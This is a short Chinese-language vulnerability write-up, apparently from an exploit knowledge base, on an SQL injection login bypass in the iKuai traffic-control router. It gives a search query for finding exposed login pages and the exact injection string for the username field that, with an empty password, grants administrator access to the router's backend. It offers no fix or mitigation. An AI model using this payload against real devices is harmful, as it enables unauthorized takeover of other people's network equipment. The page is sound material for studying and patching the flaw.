# iKuai 流控路由 SQL注入漏洞

## 漏洞描述

iKuai 流控路由 存在SQL注入漏洞，可以通过SQL注入漏洞构造万能密码获取路由器后台管理权限

## 漏洞影响

<a-checkbox checked>iKuai 流控路由</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="登录爱快流控路由"</a-checkbox></br>

## 漏洞复现

登录页面如下



![img](../../../.vuepress/public/img/image-20210531180103698.png)



使用万能密码登录后台



```plain
user: "or""=""or""="
pass: 空
```



![img](../../../.vuepress/public/img/image-20210531180212296.png)

